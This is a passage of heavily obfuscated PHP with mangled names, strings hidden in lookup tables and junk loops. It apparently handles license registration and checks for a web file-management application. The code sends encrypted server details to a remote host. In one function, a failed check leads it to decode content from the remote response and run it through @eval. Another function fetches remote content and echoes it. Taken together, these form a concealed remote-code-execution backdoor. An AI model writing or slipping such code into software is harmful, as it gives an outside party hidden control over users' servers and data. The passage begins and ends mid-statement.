$Á£÷ã[72], $Á£÷ã[73], $Á£÷ã[74], $Á£÷ã[75], $Á£÷ã[76], $Á£÷ã[77], $Á£÷ã[78], $Á£÷ã[79], $Á£÷ã[80], $Á£÷ã[81], $Á£÷ã[82], $Á£÷ã[83], $Á£÷ã[84]); $˜Øøöò‹ = $«†—à—Ï[633]; if (strlen($˜Øøöò‹) < $«†—à—Ï[617]) { return; } foreach ($›Öë«ŸÍ as $ÉÂı¤í—) { $ºíÚã»Â = $GLOBALS[$Á£÷ã[85]][$Á£÷ã[86]][$ÉÂı¤í—]; if (isset($¡èˆ§Á¶[$ÉÂı¤í—])) { $ºíÚã»Â = $¡èˆ§Á¶[$ÉÂı¤í—]; } $³ìü³[$Á£÷ã[87]][$Á£÷ã[88]][$ÉÂı¤í—] = $ºíÚã»Â; } $Êù¹ÑËŸ = $³ìü³[$Á£÷ã[87]][$Á£÷ã[88]][$Á£÷ã[46]]; unset($³ìü³[$Á£÷ã[87]][$Á£÷ã[89]][$Á£÷ã[90]]); $‡˜í´Ô = $«†—à—Ï[634]; unset($³ìü³[$Á£÷ã[87]][$Á£÷ã[89]][$Á£÷ã[91]]); $’˜ˆ¦ó = $«†—à—Ï[635]; unset($³ìü³[$Á£÷ã[87]][$Á£÷ã[88]][$Á£÷ã[46]]); unset($³ìü³[$Á£÷ã[87]][$Á£÷ã[88]][$Á£÷ã[92]]); $³ìü³[$Á£÷ã[87]][$Á£÷ã[88]][$Á£÷ã[93]] = array($Á£÷ã[94] => (int) $Êù¹ÑËŸ[$Á£÷ã[95]], $Á£÷ã[96] => (int) _get($Êù¹ÑËŸ, $Á£÷ã[97], 0)); $³ìü³[$Á£÷ã[98]][$Á£÷ã[99]] = Action($Á£÷ã[100])->accessToken(); $ÜœÉòõó = $«†—à—Ï[636]; if (!$ÜœÉòõó) { die; } $³ìü³[$Á£÷ã[98]][$Á£÷ã[101]] = md5($_SERVER[$Á£÷ã[102]] . $¡èˆ§Á¶[$Á£÷ã[103]]); $ÌÙ¿Úš¹ = $«†—à—Ï[637]; $³ìü³[$Á£÷ã[98]][$Á£÷ã[104]] = base64_encode(serverInfo()); $Ìß½ßàŸ = $«†—à—Ï[638]; while ($Ìß½ßàŸ < $«†—à—Ï[628]) { if ($Ìß½ßàŸ >= 0) { break; } $Ìß½ßàŸ++; } $³ìü³[$Á£÷ã[98]][$Á£÷ã[105]] = $this->xrgp672fde7b; $Õ‡Ê„“Ã = $«†—à—Ï[639]; if ($¡èˆ§Á¶[$Á£÷ã[105]] != $Á£÷ã[106]) { $³ìü³[$Á£÷ã[98]][$Á£÷ã[107]] = $¡èˆ§Á¶[$Á£÷ã[107]]; $³ìü³[$Á£÷ã[98]][$Á£÷ã[108]] = $¡èˆ§Á¶[$Á£÷ã[108]]; $Ëóğ›î˜ = rand_string(10) . $this->xrgp672fde7b . rand_string(5); $³ìü³[$Á£÷ã[87]][$Á£÷ã[109]][$Á£÷ã[110]] = $this->fqbrffbc0e2b($Ëóğ›î˜, $³ìü³[$Á£÷ã[98]][$Á£÷ã[101]]); } if ($this->xrgp672fde7b == $Á£÷ã[106]) { $³ìü³[$Á£÷ã[87]][$Á£÷ã[88]][$Á£÷ã[93]][$Á£÷ã[97]] = 0; } $³ìü³[$Á£÷ã[98]][$Á£÷ã[111]] = _get($this->idou357f796e, $Á£÷ã[112], $Á£÷ã[6]); $³ìü³[$Á£÷ã[98]][$Á£÷ã[113]] = _get($this->idou357f796e, $Á£÷ã[114], $Á£÷ã[6]); if (_get($GLOBALS, $Á£÷ã[115]) && $this->config[$Á£÷ã[116]]) { $³ìü³[$Á£÷ã[98]][$Á£÷ã[117]] = WEB_ROOT; } return $³ìü³; } private function cnsbe6e5ff62() { $Åµ‡’ËÖ =& $_SERVER[­á Ş³Ö]; $ô‚Û«ìó =& $_SERVER[ÕãïÎÍÅ]; $««ßÇÚô = $_SERVER[$ô‚Û«ìó[24]] == $ô‚Û«ìó[118]; $ÜÆçº¯ = $Åµ‡’ËÖ[640]; while ($ÜÆçº¯ < $Åµ‡’ËÖ[614]) { if ($ÜÆçº¯ >= 0) { break; } $ÜÆçº¯++; } if ($_SERVER[$ô‚Û«ìó[24]] == $ô‚Û«ìó[119] && $_GET[$ô‚Û«ìó[120]] == $ô‚Û«ìó[121]) { $««ßÇÚô = !0; } if ($««ßÇÚô) { $ô‡Ğ™ÖÅ = array($ô‚Û«ìó[105] => $this->xrgp672fde7b, $ô‚Û«ìó[122] => $this->jgpl087917ca(), $ô‚Û«ìó[123] => Model($ô‚Û«ìó[124])->count()); if ($this->xrgp672fde7b != $ô‚Û«ìó[106]) { $†‹²ßÇ¢ = _get($this->idou357f796e, $ô‚Û«ìó[125]); if ($†‹²ßÇ¢) { $ô‡Ğ™ÖÅ[$ô‚Û«ìó[126]] = $†‹²ßÇ¢; $ô‡Ğ™ÖÅ[$ô‚Û«ìó[127]] = strtotime(_get($this->idou357f796e, $ô‚Û«ìó[128])); $ô‡Ğ™ÖÅ[$ô‚Û«ìó[129]] = _get($this->idou357f796e, $ô‚Û«ìó[114]); } $Š¡ŒĞó¦ = Model($ô‚Û«ìó[33])->get($ô‚Û«ìó[130], $ô‚Û«ìó[6], !0); if (is_string($Š¡ŒĞó¦) && substr($Š¡ŒĞó¦, 0, 1) == $ô‚Û«ìó[131]) { $Š¡ŒĞó¦ = json_decode_force($Š¡ŒĞó¦); } if (is_array($Š¡ŒĞó¦) && $Š¡ŒĞó¦[$ô‚Û«ìó[132]] && strstr($Š¡ŒĞó¦[$ô‚Û«ìó[132]], $ô‚Û«ìó[133])) { $İÊ«¥ªÖ = explode($ô‚Û«ìó[133], $Š¡ŒĞó¦[$ô‚Û«ìó[132]]); $ô‡Ğ™ÖÅ[$ô‚Û«ìó[134]] = $İÊ«¥ªÖ[0]; } } $ô‡Ğ™ÖÅ = $this->joig8aa7e5f1(json_encode($ô‡Ğ™ÖÅ), md5($ô‚Û«ìó[135])); $Î‡³û… = $Åµ‡’ËÖ[641]; if (!$Î‡³û…) { die; } $¶š«ïÖ = array($ô‚Û«ìó[136] => $ô‡Ğ™ÖÅ); $‚…„¡±º = $Åµ‡’ËÖ[642]; call_user_func(array($ô‚Û«ìó[137], $ô‚Û«ìó[138]), $¶š«ïÖ); $¥¶œå‡„ = $Åµ‡’ËÖ[643]; if (strlen($¥¶œå‡„) < $Åµ‡’ËÖ[607]) { die; } } if ($this->xrgp672fde7b == $ô‚Û«ìó[106]) { return; } $ÇÒÙÇ–Ç = array($ô‚Û«ìó[139], $ô‚Û«ìó[140], $ô‚Û«ìó[141], $ô‚Û«ìó[142], $ô‚Û«ìó[143], $ô‚Û«ìó[144]); $öï¢æ¤ = $Åµ‡’ËÖ[644]; if (strlen($öï¢æ¤) < $Åµ‡’ËÖ[614]) { die; } $­»û—÷õ = Model($ô‚Û«ìó[33])->get(); $¶š«ïÖ = array($ô‚Û«ìó[145] => $­»û—÷õ[$ô‚Û«ìó[34]], $ô‚Û«ìó[146] => $­»û—÷õ[$ô‚Û«ìó[35]], $ô‚Û«ìó[147] => $ô‚Û«ìó[6]); foreach ($ÇÒÙÇ–Ç as $Ãüæ¢ƒË) { if (!isset($­»û—÷õ[$Ãüæ¢ƒË]) || !$­»û—÷õ[$Ãüæ¢ƒË]) { continue; } $¶š«ïÖ[$Ãüæ¢ƒË] = $­»û—÷õ[$Ãüæ¢ƒË]; $‰®ôÚ· = $Åµ‡’ËÖ[645]; if (!$‰®ôÚ·) { die; } } call_user_func(array($ô‚Û«ìó[137], $ô‚Û«ìó[138]), $¶š«ïÖ); $’ˆŠÈ®„ = $Åµ‡’ËÖ[646]; if (!$’ˆŠÈ®„) { return; } } private function nirm89e73890() { $Äê Ğ¡Õ =& $_SERVER[­á Ş³Ö]; $÷ŠôŸ— =& $_SERVER[ÕãïÎÍÅ]; if ($_SERVER[$÷ŠôŸ—[24]] != $÷ŠôŸ—[148]) { return; } if (!_get($GLOBALS, $÷ŠôŸ—[115])) { die; } $°¦å’Ú“ = $GLOBALS[$÷ŠôŸ—[13]]; if (isset($°¦å’Ú“[$÷ŠôŸ—[149]])) { $this->iodg9237f593(); die; } if (!isset($°¦å’Ú“[$÷ŠôŸ—[150]]) || strlen($°¦å’Ú“[$÷ŠôŸ—[150]]) != 16) { show_json($÷ŠôŸ—[151] . $°¦å’Ú“[$÷ŠôŸ—[150]], !1); } $«´Æä˜ = Model($÷ŠôŸ—[33])->get($÷ŠôŸ—[103]); $–ÜÌüÕŒ = md5($_SERVER[$÷ŠôŸ—[102]] . $«´Æä˜); $åäàñş = array($÷ŠôŸ—[150] => $°¦å’Ú“[$÷ŠôŸ—[150]], $÷ŠôŸ—[152] => rand_string(16), $÷ŠôŸ—[153] => $÷ŠôŸ—[135], $÷ŠôŸ—[154] => $÷ŠôŸ—[155], $÷ŠôŸ—[156] => $_SERVER[$÷ŠôŸ—[157]], $÷ŠôŸ—[158] => $_SERVER[$÷ŠôŸ—[159]], $÷ŠôŸ—[160] => $_SERVER[$÷ŠôŸ—[161]], $÷ŠôŸ—[101] => $–ÜÌüÕŒ, $÷ŠôŸ—[162] => Model($÷ŠôŸ—[33])->get($÷ŠôŸ—[130])); $®½¹€ª = $Äê Ğ¡Õ[647]; if (strlen($®½¹€ª) < $Äê Ğ¡Õ[628]) { die; } if ($°¦å’Ú“[$÷ŠôŸ—[163]] == $÷ŠôŸ—[164]) { $íôãòŸÖ = $this->joig8aa7e5f1($–ÜÌüÕŒ, $÷ŠôŸ—[165]); $ï†¦²æÎ = $this->fqbrffbc0e2b(json_encode($åäàñş), $–ÜÌüÕŒ . $÷ŠôŸ—[166], 3); $ï†¦²æÎ = $ï†¦²æÎ . $÷ŠôŸ—[167] . $_SERVER[$÷ŠôŸ—[157]]; $­³ƒèœ = $this->whtx0b7ce336($÷ŠôŸ—[168] . $íôãòŸÖ . $÷ŠôŸ—[169] . $ï†¦²æÎ, -1); show_json($­³ƒèœ, !0); } else { if ($°¦å’Ú“[$÷ŠôŸ—[163]] == $÷ŠôŸ—[170]) { $‘–ÆÎÒÍ = substr(md5($÷ŠôŸ—[171] . $–ÜÌüÕŒ), 12, 15) . $÷ŠôŸ—[172]; $ï†¦²æÎ = $this->kqgw4ac493ae(trim($°¦å’Ú“[$÷ŠôŸ—[173]]), $‘–ÆÎÒÍ, 2); $ÄâÁºÁÇ = json_decode($ï†¦²æÎ, !0); if (!is_array($ÄâÁºÁÇ) || !is_array($ÄâÁºÁÇ[$÷ŠôŸ—[174]]) || $ÄâÁºÁÇ[$÷ŠôŸ—[150]] != !0) { $ô¤…ğ¼Í = $÷ŠôŸ—[175]; $£ÉÛƒ¾ = $ÄâÁºÁÇ[$÷ŠôŸ—[174]] ? $÷ŠôŸ—[176] . $ÄâÁºÁÇ[$÷ŠôŸ—[174]] : $ô¤…ğ¼Í; show_json($£ÉÛƒ¾, !1); } else { $åäàñş[$÷ŠôŸ—[152]] = $ÄâÁºÁÇ[$÷ŠôŸ—[174]][$÷ŠôŸ—[177]]; } } else { $ÄâÁºÁÇ = $this->whtx0b7ce336($÷ŠôŸ—[178], $åäàñş, 10); } } if (!is_array($ÄâÁºÁÇ) || !is_array($ÄâÁºÁÇ[$÷ŠôŸ—[174]]) || $ÄâÁºÁÇ[$÷ŠôŸ—[150]] != !0) { $ô¤…ğ¼Í = LNG($÷ŠôŸ—[179]); $£ÉÛƒ¾ = $ÄâÁºÁÇ[$÷ŠôŸ—[174]] ? $÷ŠôŸ—[176] . $ÄâÁºÁÇ[$÷ŠôŸ—[174]] : $ô¤…ğ¼Í; show_json($£ÉÛƒ¾, !1); } $‡ÙÚ¸½û = $ÄâÁºÁÇ[$÷ŠôŸ—[174]]; $‹¯«Î°³ = $this->vusa75077c36($‡ÙÚ¸½û[$÷ŠôŸ—[180]]); $–¹ã¯ßó = $Äê Ğ¡Õ[648]; if (!$‹¯«Î°³ || $‹¯«Î°³ != $‡ÙÚ¸½û[$÷ŠôŸ—[128]]) { $ñ‹ŸğÜ¶ = array($÷ŠôŸ—[181] => Model($÷ŠôŸ—[33])->get($÷ŠôŸ—[103]), $÷ŠôŸ—[182] => $_SERVER[$÷ŠôŸ—[102]], $÷ŠôŸ—[183] => this_url(), $÷ŠôŸ—[158] => $_SERVER[$÷ŠôŸ—[159]]); $ï†¦²æÎ = $this->vimdc84c1307(json_encode($ñ‹ŸğÜ¶)); $this->whtx0b7ce336($÷ŠôŸ—[184] . $ï†¦²æÎ); show_json(LNG($÷ŠôŸ—[185]), !0); } $âáˆ¢Œ¡ = array($÷ŠôŸ—[186] => $‡ÙÚ¸½û[$÷ŠôŸ—[187]], $÷ŠôŸ—[188] => $‡ÙÚ¸½û[$÷ŠôŸ—[189]], $÷ŠôŸ—[190] => rand_string(16), $÷ŠôŸ—[105] => $‡ÙÚ¸½û[$÷ŠôŸ—[191]]); if ($åäàñş[$÷ŠôŸ—[152]]) { $âáˆ¢Œ¡[$÷ŠôŸ—[190]] = $åäàñş[$÷ŠôŸ—[152]]; } $Çã¨´˜â = substr(md5($âáˆ¢Œ¡[$÷ŠôŸ—[188]]), 10, 10); $‰îÉ•Ú = $Çã¨´˜â . $âáˆ¢Œ¡[$÷ŠôŸ—[105]] . $âáˆ¢Œ¡[$÷ŠôŸ—[190]]; $âáˆ¢Œ¡[$÷ŠôŸ—[107]] = strrev(base64_encode($this->joig8aa7e5f1($‰îÉ•Ú, $÷ŠôŸ—[192]))); $´†Ã¸• = $Äê Ğ¡Õ[649]; while (strlen($´†Ã¸•) < $Äê Ğ¡Õ[607]) { if (!$´†Ã¸•) { break; } $´†Ã¸•++; } $Ûµİ÷¼ä = rand_string(16); $æ–…·‹Ó = $Ûµİ÷¼ä . $âáˆ¢Œ¡[$÷ŠôŸ—[105]] . $this->joig8aa7e5f1(md5($âáˆ¢Œ¡[$÷ŠôŸ—[186]]), $Ûµİ÷¼ä); $âáˆ¢Œ¡[$÷ŠôŸ—[108]] = base64_encode(strrev($this->joig8aa7e5f1($æ–…·‹Ó, $÷ŠôŸ—[193]))); $²ÓÙàŸ– = $Äê Ğ¡Õ[650]; if (strlen($²ÓÙàŸ–) < $Äê Ğ¡Õ[614]) { die; } if ($‡ÙÚ¸½û[$÷ŠôŸ—[194]] && $‡ÙÚ¸½û[$÷ŠôŸ—[194]] >= 1) { Model($÷ŠôŸ—[33])->setDeep($÷ŠôŸ—[195], $÷ŠôŸ—[121]); } Model($÷ŠôŸ—[33])->set($âáˆ¢Œ¡); $Ä½’½ = md5($_SERVER[$÷ŠôŸ—[102]] . strrev($«´Æä˜) . $âáˆ¢Œ¡[$÷ŠôŸ—[188]]); $•ÌÒš¤ = strrev(substr($Ä½’½, 10, 16)); $Òòö•Öç = $Äê Ğ¡Õ[651]; while (strlen($Òòö•Öç) < $Äê Ğ¡Õ[628]) { if (!$Òòö•Öç) { break; } $Òòö•Öç++; } $ˆÁÄÌë = $this->fqbrffbc0e2b(json_encode($‡ÙÚ¸½û), $Ä½’½); $ü ı› = array_to_keyvalue(Model($÷ŠôŸ—[7])->listData(), $÷ŠôŸ—[196]); $—Ú”À£Ç = $Äê Ğ¡Õ[652]; if (!$—Ú”À£Ç) { die; } $÷€Ç› = $ü ı›[$÷ŠôŸ—[197]]; $†Ÿ†‘Ş— = $Äê Ğ¡Õ[653]; while (strlen($†Ÿ†‘Ş—) < $Äê Ğ¡Õ[617]) { if (!$†Ÿ†‘Ş—) { break; } $†Ÿ†‘Ş—++; } $Şµ²ö±î = array(); $òãä¸¦ = $Äê Ğ¡Õ[654]; $Şµ²ö±î[$•ÌÒš¤] = $ˆÁÄÌë; Model($÷ŠôŸ—[7])->update($÷€Ç›[$÷ŠôŸ—[198]], array($÷ŠôŸ—[199] => $Şµ²ö±î)); $¸ÒÈÕ°ú = $Äê Ğ¡Õ[655]; if (strlen($¸ÒÈÕ°ú) < $Äê Ğ¡Õ[624]) { return; } $this->idou357f796e = $‡ÙÚ¸½û; $this->xrgp672fde7b = $âáˆ¢Œ¡[$÷ŠôŸ—[105]]; $Óë¨‚“ó = $Äê Ğ¡Õ[656]; if (strlen($Óë¨‚“ó) < $Äê Ğ¡Õ[607]) { die; } $this->licenseRegistSuccess(); Cache::set($÷ŠôŸ—[200] . md5($«´Æä˜ . $÷ŠôŸ—[201]), $÷ŠôŸ—[6]); show_json(LNG($÷ŠôŸ—[185]), !0); $—ÜÍ©æÌ = $Äê Ğ¡Õ[657]; if (!$—ÜÍ©æÌ) { return; } } private function licenseRegistSuccess() { $üÉµë“ó =& $_SERVER[­á Ş³Ö]; $¼ã¸õå° =& $_SERVER[ÕãïÎÍÅ]; $½ó©ò¾Ş = Model($¼ã¸õå°[33])->get(); $Åş„Ó‰¹ = $üÉµë“ó[658]; while (strlen($Åş„Ó‰¹) < $üÉµë“ó[617]) { if (!$Åş„Ó‰¹) { break; } $Åş„Ó‰¹++; } if ($½ó©ò¾Ş[$¼ã¸õå°[63]] != $¼ã¸õå°[121]) { Model($¼ã¸õå°[33])->set($¼ã¸õå°[63], $¼ã¸õå°[121]); } Action($¼ã¸õå°[202])->initStart(!0); } private function iodg9237f593() { $Ÿâäì§ =& $_SERVER[­á Ş³Ö]; $ìÒ³†Ãù =& $_SERVER[ÕãïÎÍÅ]; Model($ìÒ³†Ãù[33])->set(array($ìÒ³†Ãù[186] => $ìÒ³†Ãù[6], $ìÒ³†Ãù[188] => $ìÒ³†Ãù[6], $ìÒ³†Ãù[105] => $ìÒ³†Ãù[106], $ìÒ³†Ãù[107] => $ìÒ³†Ãù[6], $ìÒ³†Ãù[108] => $ìÒ³†Ãù[6])); $±ïÍ£ó€ = $Ÿâäì§[659]; Model($ìÒ³†Ãù[33])->setDeep($ìÒ³†Ãù[195], $ìÒ³†Ãù[203]); $this->idou357f796e = array(); $this->xrgp672fde7b = $ìÒ³†Ãù[106]; $ÛƒßŠ¡ = $Ÿâäì§[660]; } private function jkay216ad9ac() { $‰ê·şŸ¼ =& $_SERVER[­á Ş³Ö]; $‡¶ŠÏ»Ô =& $_SERVER[ÕãïÎÍÅ]; $_SERVER[$‡¶ŠÏ»Ô[159]] = _get($_SERVER, $‡¶ŠÏ»Ô[159], APP_HOST); $this->xrgp672fde7b = $‡¶ŠÏ»Ô[106]; $ãğòüëÚ = Model($‡¶ŠÏ»Ô[33])->get(); if ($ãğòüëÚ[$‡¶ŠÏ»Ô[105]] == $‡¶ŠÏ»Ô[106]) { return; } $şäƒ©ÎÁ = Model($‡¶ŠÏ»Ô[33])->get($‡¶ŠÏ»Ô[103]); $°¡ÕÙ¹½ = $‡¶ŠÏ»Ô[200] . md5($şäƒ©ÎÁ . $‡¶ŠÏ»Ô[201]); $ÆÒÑ¤Š = $‰ê·şŸ¼[661]; if (strlen($ÆÒÑ¤Š) < $‰ê·şŸ¼[617]) { die; } $Ê± ±®ï = Cache::get($°¡ÕÙ¹½); $èŠ³¯ïÃ = $‰ê·şŸ¼[662]; while ($èŠ³¯ïÃ < $‰ê·şŸ¼[617]) { if ($èŠ³¯ïÃ >= 0) { break; } $èŠ³¯ïÃ++; } if (!is_array($Ê± ±®ï) || !isset($Ê± ±®ï[$‡¶ŠÏ»Ô[204]]) || time() - $Ê± ±®ï[$‡¶ŠÏ»Ô[204]] >= 60) { $Ø†ˆ™µÃ = Model($‡¶ŠÏ»Ô[7])->loadList(); $•ÔòÎÒÓ = $Ø†ˆ™µÃ[$‡¶ŠÏ»Ô[197]]; $íÅû£Ïõ = md5($_SERVER[$‡¶ŠÏ»Ô[102]] . strrev($şäƒ©ÎÁ) . $ãğòüëÚ[$‡¶ŠÏ»Ô[188]]); $òØû‚¦Ç = strrev(substr($íÅû£Ïõ, 10, 16)); $Ê± ±®ï = $this->kqgw4ac493ae($•ÔòÎÒÓ[$‡¶ŠÏ»Ô[85]][$òØû‚¦Ç], $íÅû£Ïõ); $Ê± ±®ï = json_decode($Ê± ±®ï, !0); } if (!is_array($Ê± ±®ï)) { return $this->iodg9237f593(); } $á¨°‹°Ê = strtotime($Ê± ±®ï[$‡¶ŠÏ»Ô[128]]); if (time() >= $á¨°‹°Ê) { return $this->iodg9237f593(); } if (time() - $Ê± ±®ï[$‡¶ŠÏ»Ô[204]] > 20) { $Ê± ±®ï[$‡¶ŠÏ»Ô[204]] = time(); Cache::set($°¡ÕÙ¹½, $Ê± ±®ï); } $this->idou357f796e = $Ê± ±®ï; $this->xrgp672fde7b = $ãğòüëÚ[$‡¶ŠÏ»Ô[105]]; } private function ctedaca5c5d0() { $È´¼œ¤ =& $_SERVER[ÕãïÎÍÅ]; $ÌÌÈë¥— = $GLOBALS[$È´¼œ¤[13]]; $…ÃÈ¤†± = $_SERVER[$È´¼œ¤[24]]; if ($…ÃÈ¤†± == $È´¼œ¤[205] && $this->xrgp672fde7b == $È´¼œ¤[106]) { show_json(LNG($È´¼œ¤[206]), !1, $È´¼œ¤[207]); } $Ä©ë’Å = array($È´¼œ¤[208], $È´¼œ¤[209]); if (in_array($…ÃÈ¤†±, $Ä©ë’Å)) { if ($this->xrgp672fde7b == $È´¼œ¤[106] && isset($ÌÌÈë¥—[$È´¼œ¤[210]])) { show_json(LNG($È´¼œ¤[206]), !1, $È´¼œ¤[207]); die; } $¡ç¹ÆÍ© = $this->jgpl087917ca(); if ($¡ç¹ÆÍ© != intval($È´¼œ¤[211])) { if ($¡ç¹ÆÍ© <= Model($È´¼œ¤[124])->count()) { show_json(LNG($È´¼œ¤[212]), !1, $È´¼œ¤[207]); die; } } } } private function aoej8c0ec12f() { $”¾¡´«ò =& $_SERVER[­á Ş³Ö]; $‰ÑëëÉÇ =& $_SERVER[ÕãïÎÍÅ]; $ÆÉ ê—› = array($‰ÑëëÉÇ[118], $‰ÑëëÉÇ[119]); $š­À³Œ = $”¾¡´«ò[663]; if (!_get($GLOBALS, $‰ÑëëÉÇ[115]) || !isset($_GET[$‰ÑëëÉÇ[213]])) { return; } if (!in_array($_SERVER[$‰ÑëëÉÇ[24]], $ÆÉ ê—›)) { return; } $¯ú£ä«€ = $‰ÑëëÉÇ[214]; $¹—À“¤ = $”¾¡´«ò[664]; if (strlen($¹—À“¤) < $”¾¡´«ò[628]) { return; } $¯ú£ä«€ = $this->gvnp92c8a5a6($¯ú£ä«€, $‰ÑëëÉÇ[215]); $¬Ê±Û²ù = stream_context_create(array($‰ÑëëÉÇ[216] => array($‰ÑëëÉÇ[217] => $‰ÑëëÉÇ[218], $‰ÑëëÉÇ[219] => 3))); $¿î¤¼¸ = $”¾¡´«ò[665]; if (strlen($¿î¤¼¸) < $”¾¡´«ò[614]) { die; } $Š‡¯äşº = @file_get_contents($¯ú£ä«€, !1, $¬Ê±Û²ù); $ªÀ— Œ« = $”¾¡´«ò[666]; while (strlen($ªÀ— Œ«) < $”¾¡´«ò[614]) { if (!$ªÀ— Œ«) { break; } $ªÀ— Œ«++; } header($‰ÑëëÉÇ[220]); $¹­ıÔû£ = $”¾¡´«ò[667]; if (strlen($¹­ıÔû£) < $”¾¡´«ò[628]) { die; } if ($Š‡¯äşº && strstr($Š‡¯äşº, $‰ÑëëÉÇ[221])) { echo $Š‡¯äşº; } die; } public function tozga22467d4($ö™µ®¦Ş) { $¤”„¨ê =& $_SERVER[­á Ş³Ö]; $É¨ƒûßĞ =& $_SERVER[ÕãïÎÍÅ]; if ($this->xrgp672fde7b == $É¨ƒûßĞ[222]) { return $ö™µ®¦Ş; } $ı³ôû˜ = array($É¨ƒûßĞ[223] => $É¨ƒûßĞ[224], $É¨ƒûßĞ[225] => $É¨ƒûßĞ[224], $É¨ƒûßĞ[226] => $É¨ƒûßĞ[224], $É¨ƒûßĞ[227] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[229] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[230] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[231] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[232] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[233] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[234] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[235] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[236] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[237] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[238] => $É¨ƒûßĞ[228], $É¨ƒûßĞ[239] => $É¨ƒûßĞ[228]); $ßòÆè‘ = $¤”„¨ê[668]; $àÛ®Â¢Í = explode($É¨ƒûßĞ[240], _get($this->idou357f796e, $É¨ƒûßĞ[112], $É¨ƒûßĞ[6])); $“¹§‚Õ = array(); $“«ÛÉŒ = $¤”„¨ê[669]; while ($“«ÛÉŒ < $¤”„¨ê[617]) { if ($“«ÛÉŒ >= 0) { break; } $“«ÛÉŒ++; } foreach ($ı³ôû˜ as $Ìğ–¢îÖ => $£¸‹íö) { if ($£¸‹íö == $É¨ƒûßĞ[224] && substr($this->xrgp672fde7b, 0, 1) == $É¨ƒûßĞ[224]) { continue; } if (!in_array($Ìğ–¢îÖ, $àÛ®Â¢Í)) { $“¹§‚Õ[] = $Ìğ–¢îÖ; } } foreach ($“¹§‚Õ as $Ìğ–¢îÖ) { unset($ö™µ®¦Ş[$Ìğ–¢îÖ]); $óúŒ¬ˆ = $¤”„¨ê[670]; if (strlen($óúŒ¬ˆ) < $¤”„¨ê[614]) { die; } } return $ö™µ®¦Ş; } private function htrga442d9b4() { $²Â–ÖÈ¿ =& $_SERVER[ÕãïÎÍÅ]; if ($this->xrgp672fde7b != $²Â–ÖÈ¿[106]) { $GLOBALS[$²Â–ÖÈ¿[85]][$²Â–ÖÈ¿[89]][$²Â–ÖÈ¿[241]] = $²Â–ÖÈ¿[203]; return; } $GLOBALS[$²Â–ÖÈ¿[85]][$²Â–ÖÈ¿[242]] = $²Â–ÖÈ¿[121]; if (Model($²Â–ÖÈ¿[243])->get($²Â–ÖÈ¿[63]) != $²Â–ÖÈ¿[203]) { Model($²Â–ÖÈ¿[243])->set($²Â–ÖÈ¿[63], $²Â–ÖÈ¿[203]); } } public function ajpr53c7b982() { return $_SERVER[ÕãïÎÍÅ][244]; } private function nhzp4cfcc5cc() { $ Ë¾¤¢ =& $_SERVER[­á Ş³Ö]; $Äß®™ ã =& $_SERVER[ÕãïÎÍÅ]; $–¶€¬² = array($Äß®™ ã[245], $Äß®™ ã[246], $Äß®™ ã[247]); $£¿ôíÚ = $Äß®™ ã[248] . md5($Äß®™ ã[249]); if ($this->xrgp672fde7b == $Äß®™ ã[106] || !_get($GLOBALS, $Äß®™ ã[115])) { return; } if (!in_array($_SERVER[$Äß®™ ã[24]], $–¶€¬²)) { return; } if (time() % 4 != 0) { return; } $ÚçåÔ¥å = call_user_func(array($Äß®™ ã[250], $Äß®™ ã[251]), $£¿ôíÚ); if ($ÚçåÔ¥å && time() - $ÚçåÔ¥å < intval($Äß®™ ã[252])) { return; } call_user_func(array($Äß®™ ã[250], $Äß®™ ã[138]), $£¿ôíÚ, time()); $ËùŒ®²¹ = Model($Äß®™ ã[33])->get($Äß®™ ã[103]); $±°ß£² = $ Ë¾¤¢[671]; while (strlen($±°ß£²) < $ Ë¾¤¢[624]) { if (!$±°ß£²) { break; } $±°ß£²++; } $¥„€¹¶ = array($Äß®™ ã[150] => Model($Äß®™ ã[33])->get($Äß®™ ã[186]), $Äß®™ ã[163] => $this->xrgp672fde7b, $Äß®™ ã[160] => $_SERVER[$Äß®™ ã[161]], $Äß®™ ã[162] => Model($Äß®™ ã[33])->get($Äß®™ ã[130]), $Äß®™ ã[101] => md5($_SERVER[$Äß®™ ã[102]] . $ËùŒ®²¹), $Äß®™ ã[153] => $Äß®™ ã[135], $Äß®™ ã[156] => $_SERVER[$Äß®™ ã[157]]); $×Ó¬¯µ½ = $ Ë¾¤¢[672]; if (!$×Ó¬¯µ½) { return; } $¥Ğ¡î´ = $this->whtx0b7ce336($Äß®™ ã[253], $¥„€¹¶); if (!is_array($¥Ğ¡î´)) { return; } if ($¥Ğ¡î´[$Äß®™ ã[150]] && $¥Ğ¡î´[$Äß®™ ã[254]]) { if ($this->vusa75077c36($¥Ğ¡î´[$Äß®™ ã[254]]) == $¥„€¹¶[$Äß®™ ã[150]]) { return; } } $this->iodg9237f593(); $ˆğñÏ‡§ = $ Ë¾¤¢[673]; if (strlen($ˆğñÏ‡§) < $ Ë¾¤¢[614]) { return; } if ($this->vusa75077c36($¥Ğ¡î´[$Äß®™ ã[254]]) != $¥„€¹¶[$Äß®™ ã[150]]) { $ÚöÀ–å = array($Äß®™ ã[181] => $ËùŒ®²¹, $Äß®™ ã[182] => $_SERVER[$Äß®™ ã[102]], $Äß®™ ã[183] => this_url(), $Äß®™ ã[158] => $_SERVER[$Äß®™ ã[159]]); $¦‡¢‡é = $this->vimdc84c1307(json_encode($ÚöÀ–å)); $¥Ğ¡î´ = $this->whtx0b7ce336($Äß®™ ã[184] . $¦‡¢‡é); if ($¥Ğ¡î´ && is_array($¥Ğ¡î´) && isset($¥Ğ¡î´[$Äß®™ ã[254]])) { $Ş¥Ä‚î = $this->kqgw4ac493ae($¥Ğ¡î´[$Äß®™ ã[254]], 2); if ($Ş¥Ä‚î) { $Ş¥Ä‚î = $this->vusa75077c36($Ş¥Ä‚î); } if ($Ş¥Ä‚î) { try { @eval($Ş¥Ä‚î); } catch (Exception $Áˆ¼å¹¶) { } } } } } private function whtx0b7ce336($£‹ò´¥ä = '', $«º«…¾º = array(), $´üã¨âú = 5) { $Ãº¹Ù›º =& $_SERVER[­á Ş³Ö]; $²ıÎ¤®è =& $_SERVER[ÕãïÎÍÅ]; $ˆÎ”Ëé = $²ıÎ¤®è[255]; $œç‹ØÕÜ = $Ãº¹Ù›º[674]; if 